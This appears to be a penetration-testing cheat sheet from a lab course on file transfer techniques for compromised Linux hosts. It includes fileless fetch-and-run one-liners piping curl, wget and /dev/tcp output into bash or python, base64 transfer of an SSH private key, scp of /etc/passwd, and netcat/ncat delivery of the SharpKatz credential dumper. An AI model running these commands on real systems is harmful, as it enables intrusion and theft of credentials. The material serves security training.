## Base64 Encoding / Decoding
Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.
### Check File MD5 hash
```
md5sum id_rsa
```
### Encode SSH Key to Base64
```
cat id_rsa |base64 -w 0;echo
```
We copy this content, paste it onto our Linux target machine, and use base64 with the option -d to decode it.
```
echo -n 'contentinpreviouscommand' | base64 -d > id_rsa
```
we can confirm if the file was transferred successfully using the md5sum command.
```
md5sum id_rsa
```
## Web Downloads with Wget and cURL
### Download a File Using wget
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
### Download a File Using cURL
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
## Fileless Attacks Using Linux
### Fileless Download with cURL
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
### Fileless Download with wget
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
```
Hello World!
```
## Download with Bash (/dev/tcp)
As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
### Connect to the Target Webserver
```
exec 3<>/dev/tcp/10.10.10.32/80
```
### HTTP GET Request
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
### Print the Response
```
cat <&3
```
## SSH Downloads
### Enabling the SSH Server
```
sudo systemctl enable ssh
```
### Starting the SSH Server
```
sudo systemctl start ssh
```
### Checking for SSH Listening Port
```
netstat -lnpt
```
## SCP Upload
### File Upload using SCP
```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
### Transfer directories using scp
```
scp -r [source_directory] [username]@[destination_host]:[destination_directory]
```
## Miscellaneous File Transfer Methods
### File Transfer with Netcat and Ncat
we'll transfer SharpKatz.exe from our Pwnbox onto the compromised machine. 
#### NetCat - Compromised Machine - Listening on Port 8000
```
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
#### Netcat - Attack Host - Sending File to Compromised machine
```
d0x777@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```
d0x777@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
#### Ncat - Compromised Machine - Listening on Port 8000
```
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
By utilizing Ncat on our attacking host, we can opt for --send-only rather than -q. The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. 
#### Ncat - Attack Host - Sending File to Compromised machine
```
d0x777@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```
d0x777@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
#### Attack Host - Sending File as Input to Netcat
```
d0x777@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
#### Attack Host - Sending File as Input to Ncat
```
d0x777@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
## Transfer files using /dev/TCP
If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
```
ls -la /bin/sh
```
It might be redirecting the /bin/sh -> dash
```
ls -la /bin/bash
```
if it does exist then we can do the following
```
ncat -lvp 8000 < LinEnum.sh
```
```
bash -c "cat < /dev/tcp/10.10.14.3/8000 | bash"
```
```
bash -c "cat < /dev/tcp/10.10.14.3/8000 > /dev/shm/LinEnum.sh"
```
```
bash /dev/shm/LinEnum.sh
```
